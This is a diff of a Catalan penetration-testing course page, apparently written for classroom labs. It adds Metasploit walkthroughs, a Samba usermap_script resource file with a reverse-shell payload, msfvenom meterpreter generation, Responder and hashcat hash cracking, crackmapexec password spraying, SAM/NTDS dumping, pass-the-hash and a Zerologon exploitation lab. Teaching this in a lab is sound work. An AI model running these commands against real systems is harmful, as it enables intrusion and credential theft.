@@ -928,7 +928,8 @@ que després no es canvien quan es posen en producció. Este error s'anomena " <
     <pre>sudo apt update
 sudo apt install metasploit-framework </pre>
      <p>Metasploit disposa d'una base de dades PostGreSQL, i una comanda per manipular: <strong>msfdb</strong></p>
-    <pre>msfdb init | reinit | delete | start | stop |status | run      </pre>
+    <pre>sudo msfdb init | reinit | delete | start | stop |status | run     
+# Esta comanda s'ha de llançar amb permisos (sudo , o ser root) </pre>
     <p>La primera vegada, init i start, i després sols start</p>
     <p>Una vegada iniciada la bbdd executarem la comanda  <strong>msfconsole</strong>  , per entrar, i es mostrarà..</p>
     <pre>msf ></pre>
@@ -937,14 +938,8 @@ sudo apt install metasploit-framework </pre>
 
 <ul>
   <li>La base de dades no està connectada</li>
-  <li>No es guarden resultats com:</li>
-  <ul>
-    <li>hosts</li>
-    <li>serveis</li>
-    <li>vulnerabilitats</li>
-    <li>credencials</li>
-  </ul>
-  <li>Ordres com hosts, services, creds, etc. no funcionen o eixen buides</li>
+  <li>No es guarden resultats de: hosts, serveis, vulnerabilitats, credencials</li>
+  <li>I les ordres com: services, vulns, hosts,  creds, etc. no funcionen o eixen buides</li>
 </ul>
 <p>Normalment veuràs un missatge tipus: <code>Database not connected</code> i 
 Metasploit funcionarà en mode “sense persistència”  </p>
@@ -960,9 +955,28 @@ db_status   db_connect  (per connectar a la bbdd sense eixir de msf> ) </pre>
 workspace name    -- cambia al workspace name
 opcions: -a --add name  -d --delete name   -r --rename old new    -v 
 workspace default    -- ix d'un workspace / no hi ha exit workspace      </pre>
+    
+      <h2>Fingerprint d'equip(s) destí</h2>
+      <p>Metasploit pot executar Nmap dins seu:</p>
+      <pre>db_nmap -sV 192.168.1.10
+# i després d'acabar, els resultats es guarden en la BBDD de msf 
+# i es poden consultar amb ordres com:
+services
+vulns
+hosts    </pre>
+<p>Metasploit té un sistema de notes internes associades a hosts o sessions.</p>
+<pre>Exemple:
+notes add -t exploit -n "Samba vulnerable a usermap_script, accés root" &lt;IP_víctima>   </pre>
+
+<!--   Altres comandes:  loot, hashes,  configs, credencials,   cread add user:pass
+ sessions   sessions -i 1      sessions -k 1       sessions -u 1   # upgrade a meterpreter
+ jobs    jobs -k 1       background
+ history    spool   
+           -->
 
     <h2>Gestió de mòduls</h2>
-    <p>La gestió de mòduls es fonamental per conduir metasploit</p>
+    <p>La gestió de mòduls es fonamental per conduir metasploit. Una vegada es té identificat el destí de l'atac, amb coneixement de les vulnerabilitats, 
+      s'haurà de buscar un exploit adequat per intentar atacar       </p>
     <pre>search   o    help search 
 msf > search smb
 msf > search type:auxiliary smb
@@ -970,8 +984,8 @@ msf > search type:exploit smb
 msf > search cve:2014-3791
 msf > search type:exploit arch:x86 platform:Windows     </pre>
     <h3>Càrrega i configuració de mòduls </h3>
-    <p>Una vegada es fa la cerca, es mostren resultats, numerats. Es pot fer un <code>info</code> i a continuació 
-    el num, o un <code>use</code> i a continuació el num</p>
+    <p>Una vegada es fa la cerca, es mostren resultats, numerats. Es pot fer un <code><strong>info</strong></code> i a continuació 
+    el num, o un <code><strong>use</strong></code> i a continuació el num. En compte del num, es pot posar el nom de l'exploit.</p>
     <pre>Matching Modules
 ================
   #      Name    
@@ -979,37 +993,36 @@ msf > search type:exploit arch:x86 platform:Windows     </pre>
   1 
   2     .........
   3     auxiliary/scanner/smb/smb_version  </pre>
-  <p>On # és un num per usar junt a <code>use</code>, o també es pot usar el Nom(Name)</p>
+  <p>On # és un num per usar junt a <code>use</code>, (o el Nom(Name))</p>
   <pre>Es pot fer , use 3, info 3,  o use auxiliary/scanner/smb/smb_version </pre>
     <p>Si es fa un <code>info</code>, ens mostra l'autor, i si soporta un <code>check</code></p>
-    <pre>Una vegada es fa un use, cambia el prompt, i es podrà executar <code>info</code> o <code>options</code> o <code>show options</code>
- use auxiliary/scanner/smb/smb_version   
+    <pre># Una vegada es fa un use, cambia el prompt, i es podrà executar <code>info</code> o <code>options</code> o <code>show options</code>
+use auxiliary/scanner/smb/smb_version   
 msf  exploit(<strong><span style="color: crimson;">auxiliary/scanner/smb/smb_version</span></strong>) > </pre>
     <p>Es mostra una informació incial, de nom, autor, ruta, si suporta check, i la secció més important es <code>Basic options</code> 
       on es mostren les opcions o variables que té el mòdul</p>
     <p>També diu els <code>Current setting</code> i si es <code>Required</code> o no, i una columna de <code>Description</code></p>
-    <p>Els valors es podran establir en usar el mòdul amb  <strong><code>SET</code></strong> i el nom de la opció </p>
-    <pre>Per exemple
+    <p>Els valors es podran establir amb  <strong><code>SET</code></strong> i el nom de la opció, i a continuacio el VALOR </p>
+    <pre># Per exemple
 msf  exploit(<strong><span style="color: crimson;">auxiliary/scanner/smb/smb_version</span></strong>) > set RHOSTS 192.168.1.24
-   Per establir el valor de la opció (que és <code>Required</code>)   </pre>
+#  Per establir el valor de la opció (que és <code>Required</code>)   </pre>
    <p>Després d'establir valors, es poden comprobar amb <code>show options</code> o options</p>
    <pre>show options</pre>
-   <p>Per poder llançar exitosament un exploit, s'ha de donar valor a les opcions <code><strong>Required</strong></code></p>
-    <p>Està la comanda <code>SET</code> per a posar valors a les variables i la comanda <code>UNSET</code> per llevar valors</p>
-    <p>(Existeix la comanda <code>setg i unsetg</code> per posar o llevar valors de forma global)</p>
+   <p>Per poder llançar exitosament un exploit, s'ha de donar valor a les opcions <code><strong>Required</strong></code>, i de vegades a altes també...</p>
+    <p>També està la comanda <code>UNSET</code> per llevar valors. (Existeix la comanda <code>setg i unsetg</code> per posar o llevar valors de forma global)</p>
     <p>I una vegada amb tots els valors establits, es pot llançar amb <pre><code>run</code> o <code>exploit</code></pre></p>
     <p>De vegades es pot canviar el PAYLOAD d'un EXPLOIT , abans de llançar-lo</p>
     <pre>msf  exploit(<strong><span style="color: crimson;">auxiliary/scanner/smb/smb_version</span></strong>) > SET PAYLOAD windows/x64/meterpreter/...</pre>
   
    <p>Comprovar si és vulnerable (sense atacar). Molt important i sovint obligatori:</p>
   <pre>check</pre>
-    <p>Altra opció molt útil és poder saber quins PAYLOADS hi ha per a un exploit. Una vegada explotat, i abans de llançar l'exploit...</p>
+    <p>Altra opció molt útil és poder saber quins PAYLOADS hi ha per a un exploit. Abans de llançar l'exploit...</p>
     <pre>SHOW PAYLOADS</pre>
 
-      <p>Metasploit NO substitueix Nmap ni un escàner de vulnerabilitats complet (com Nessus).
-         Metasploit pot detectar possibles vulnerabilitats, però ho fa amb mòduls concrets, no amb un escaneig global automàtic.</p>
-        <p>Exemple pràctic: escanejar SMB</p>
-        <pre>search type:auxiliary scanner
+    <p>Metasploit NO substitueix Nmap ni un escàner de vulnerabilitats complet (com Nessus).
+        Metasploit pot detectar possibles vulnerabilitats, però ho fa amb mòduls concrets, no amb un escaneig global automàtic.</p>
+    <p>Exemple pràctic: escanejar SMB</p>
+      <pre>search type:auxiliary scanner
 use auxiliary/scanner/smb/smb_version
 set RHOSTS 192.168.1.10
 run </pre>
@@ -1017,32 +1030,28 @@ run </pre>
           Després pots buscar exploits compatibles:</p>
           <pre>search smb  </pre>
 
-      <p>Metasploit pot executar Nmap dins seu:</p>
-      <pre>db_nmap -sV 192.168.1.10
-i després
-services
-hosts    </pre>
 
     <hr><h1>msfvenom</h1>
    <p> msfvenom és una eina del Metasploit Framework que s’utilitza  en seguretat informàtica per a crear
      payloads (càrregues útils). Un payload és un xicotet programa que fa alguna acció quan s’executa en un sistema.</p>
    <p>Important: msfvenom no entra en cap sistema. Només genera el payload. L’explotació de la vulnerabilitat és una altra part diferent.</p>
-    <br>
-    <p>En entorns autoritzats (laboratoris, empreses, formació), s’usa per a:
-
+    <p>En entorns autoritzats (laboratoris, empreses, formació), s’usa per a:</p>
     <ul>
       <li>Simular atacs reals en pentesting</li>
       <li>Provar si un antivirus detecta payloads</li>
       <li>Entrenar equips de seguretat (red team / blue team)</li>
-      <li>Analitzar com reaccionen els sistemes davant codi maliciós</p></li>
+      <li>Analitzar com reaccionen els sistemes davant codi maliciós</li>
     </ul>
     <h3>Com funciona</h3>
-    <p>1. Payload  </p> Obrir una connexió remota, Executar ordres, Obtenir informació del sistema
-    <p>2. Plataforma i arquitectura</p> El sistema operatiu de destí (Windows, Linux, Android…), L’arquitectura (x86, x64, ARM…)
-    <p>3. Encoders (ofuscació)</p> Ofuscar el payload, Canviar la seua signatura
-    <p>4. Format d’eixida</p>  El payload pot generar-se com: Un executable, Un script, Una llibreria, Codi brut (shellcode)
+    <ol>
+      <li>Payload :  Obrir una connexió remota, Executar ordres, Obtenir informació del sistema</li>
+      <li>Plataforma i arquitectura :  El sistema operatiu de destí (Windows, Linux, Android…), L’arquitectura (x86, x64, ARM…)</li>
+      <li>Encoders (ofuscació) :  Ofuscar el payload, Canviar la seua signatura</li>
+      <li>Format d’eixida :   El payload pot generar-se com: Un executable, Un script, Una llibreria, Codi brut (shellcode)</li>
+    </ol>
+
     <p>Tot i això, no s’executa sol: cal una vulnerabilitat o una execució manual.</p>
-      <pre>Exemple de creació de payload
+      <pre># Exemple de creació de payload
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=4444 -f elf > meterpreter.elf        </pre>
   <p>Este payload s'haurà de pujar a la maq víctima i executar</p>
   <pre>chmod +x meterpreter.elf
@@ -1051,6 +1060,39 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=4444 -f elf 
     <hr><p>Una altra eina del framework de metasploit es <code>msfupdate</code>, que permet: Actualitzar Metasploit i Afegir nous mòduls i correccions</p>
     <pre>msfupdate</pre>
 
+    <hr><h1>scripts</h1>
+    <p>Es poden crear "resource script" (per automatitzar msf)</p>
+<pre>
+Exemple samba.rc:
+
+# Exploit Samba usermap_script   ( comentari en .rc)
+use exploit/multi/samba/usermap_script
+set RHOST 192.168.56.101
+set PAYLOAD cmd/unix/reverse
+set LHOST 192.168.56.1
+run  </pre>
+<p>I després s'executa des del SO amb</p>
+<pre>msfconsole -r samba.rc </pre>
+<p>O des de dins de msf, amb:</p>
+<pre>resource metasploitable2.rc  </pre>
+
+
+     <!-- <hr><h1>armitage</h1>
+      <p>Armitage és bàsicament Metasploit amb interfície gràfica, ideal per visualitzar atacs, entendre el flux i treballar en equip.</p>
+      <p>No ve instal·lat en l'última versió de kali, pero si posem <code>armitage</code> ens pregunta si volem instal·lar, li posem Y i avant...</p>
+      <p>!!  En 2026 , la versió d'armitage és del 2015 !!</p>
+      <pre>  --  Abans de executar armitage, connectem la base de dades de msf
+sudo msfdb start 
+armitage</pre>
+     <ul> Una vegada el gui obert
+      <li>Afegir víctima : Hosts → Add Hosts</li>
+      <li>Scanejar víctima : Clic dret sobre la màquina ➜ Scan → Intense Scan</li>
+      <li>Veure vulnerabilitats : Click dret sobre la maquina → Services</li>
+      <li>Llançar un exploit : Clic dret sobre el host ➜ Attack → Find Attacks </li>
+      I després : Attack → Exploit → samba → usermap_script
+      <li>Quan tens una sessió: Shell → Interact  o    Meterpreter → Interact</li>
+      <li>Post-explotació : Post → Enumerate   o   Post → Privilege Escalation </li>
+     </ul>   -->
 
     </section>             
 
@@ -1130,19 +1172,32 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=4444 -f elf 
     <pre>$ sudo responder -I eth0</pre>
     <p>Es posa en marxa la ferramenta i des d'un client s'intenta accedir a un recurs compartit, per exemple, una carpeta</p>
     <p>Al cap d'una estona, <code>responder</code> captura un HASH</p>
+    <p>La ferramenta <strong>responder</strong> es pot usar conjuntament amb la ferramenta <strong>ntlmrelayx.py</strong> inclosa en la llibreria <strong>impacket</strong></p>
+    <p>Els hash <strong>Net-NTLM o Net-NTLMv2</strong> s'han de crackejar posteriorment amb eines com <strong>john o hashcat</strong></p>
+    <pre># En haschcat el mode 5600 és l'indicat per a hash de tipus Net-NTLMv2
+hashcat -m 5600 net-ntlmhash.txt password-dic-txt --force</pre>
     <p> ** Una altra opció es utilitzar <code>responder</code> com a un servidor WPAD i forçar l'autenticació bàsica d'usuaris per obtenir les credencials en text pla</p>
+    <pre>sudo responder -I eth0 -wFb</pre>
 
     <h2>Password spraying</h2>
-     <p>Una vegada es tenen unes credencials, es pot fer un <code>password spraying</code> intentant fer servir 
-    estes credencials en altres serveis, recursos o màquines assolibles</p>
-    <p>Una eina per fer este atac es <strong>crackmapexec</strong></p>
+     <p>Una vegada es tenen unes credencials, es pot fer un <code><strong>password spraying</strong></code>. Consistix en probar si amb una contrasenya es possible logejar
+      en diferents equips (o serveis) i diferent usuaris, donat que sovint, algunes contrasenyes són reutilitzades pels usuaris</p>
+    <p>Una eina per fer este atac es <strong><code>crackmapexec</code></strong></p>
+    <pre>sudo crackmapexec smb 192.168.56.0/24 -u "anabel" -p "Empresa00" --rid-brute</pre>
 
     <h2>Atac Pass the Hash</h2>
     <p>Un atac pass-the-hash (PtH) es produeix quan un atacant captura les credencials d'inici de sessió d'un compte
        (concretament els valors hash en lloc de les contrasenyes en text pla), des d'un dispositiu i utilitza els 
-       valors hash capturats per a autenticar-se en altres dispositius o serveis dins d'una xarxa</p>
+       valors hash capturats per a autenticar-se en altres dispositius o serveis dins d'una xarxa. Estos hash (LMHash i NTHaxh) s'emmagatzemen en els fitxers
+      SAM i NTDIS.dit</p>
     <p>L'eina  <strong>crackmapexec</strong>, es pot fer servir per a recuperar hashes de SAM, amb l'opció --sam 
     i també per fer l'atac, amb l'opciò -H </p>
+    <pre># Recuperar hash
+sudo crackmapexec smb 192.168.56.0/24 -u "anabel" -p "Empresa00" --sam
+sudo crackmapexec smb 192.168.56.0/24 -u "anabel" -p "Empresa00" --ntds vss      </pre>
+
+    <pre># Atac pass the hash
+sudo crackmapexec smb 192.168.56.0/24 -u "administrador" -H c84fe574ee85df553     </pre>
 
     <!--     <h2>Atac a kerberos</h2>-->
 
@@ -1153,7 +1208,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_kali> LPORT=4444 -f elf 
     <h1>Accions en la màquina explotada</h1>
     <h2>Reverse Shell </h2>
     <p>S'ha vist en el tema anterior com fer shell inversa en linux , aprofitant les vulnerabilitats web</p>
-     <p>Es vora en este punt com fer el mateix amb Windows</p>
+     <p>Es vorà en este punt com fer el mateix amb Windows</p>
      <p>Una vegada connectats a una màquina Windows, utilitzarem Powershell per obrir connexions.</p>
      <p>En la web <code>PayloadsAllTheThings</code> hi ha diferents payloads per obtenir reverseShell. Copiem-peguem i executem</p>
      <p>Previament en la màquina kali hem d'escoltar amb <code>nc -lnvp 9000</code>, per exemple, encara que esta shell no estarà estabilitzada</p>
@@ -1190,6 +1245,44 @@ curl http://ip:puerto/recurs -o fitxer
 
     <section id="labs">
     <h1>Laboratoris</h1>
+    <h2>MitM amb Ettercap</h2>
+    <h2>Web desactualitzada en metasploitable3</h2>
+    <h2>Mètode HTTP PUT en Apache 2.2.21</h2>
+    <h2>Domain Admin amb Zerologon (CVE-2020-1472)</h2>
+    <p>Afecta a Windows Server 2008R2, 2021 2012R2, 2016 i 2019, concretament a la implementació en la criptografia del protocol
+      <strong>Netlogon Remote Protocol</strong>      </p>
+    <h3>Comprovar vulnerabilitat</h3>
+    <pre># clonar en /opt
+git clone https://github.com/SecuraBV/CVE-2020-1472.git</pre>
+<pre># dins de /opt/CVE-2020-1472  , instal·lar dependències
+cd CVE-2020-1472
+python3 -m venv .venv  
+source .venv/bin/activate  
+python3 -m pip install -r requeriments.txt  </pre>
+<pre># provar vulnerabilitat
+python3 zerologon_tester.py   </pre>
+    <h3>Explotació de la vulnerabilitat</h3>
+    <pre># clonar en /opt
+git clone https://github.com/dirkjanm/CVE-2020-1472.git</pre>
+<pre># dins de /opt/CVE-2020-1472  , instal·lar dependències
+cd CVE-2020-1472
+python3 -m venv .venv  
+source .venv/bin/activate  
+pip install impacket  </pre>
+<pre># modifica la contrasenya a blanc (sense contrasenya)
+CVE-2020-1472-exploit.py
+# recupera la bbdd de hash 
+secretsdump.py 
+# torna a posar la contrasenya inicial (per borrar pistes d'intrussió)
+restorepassword.py  
+</pre>
+  <h3>Restauració de l'entorn al estat original</h3>
+    <pre># clonar en /opt
+git clone https://github.com/risksense/zerologon.git</pre>
+<pre>#
+python3 reinstall_original_pw.py   </pre>
+
+
 
     </section>         
    
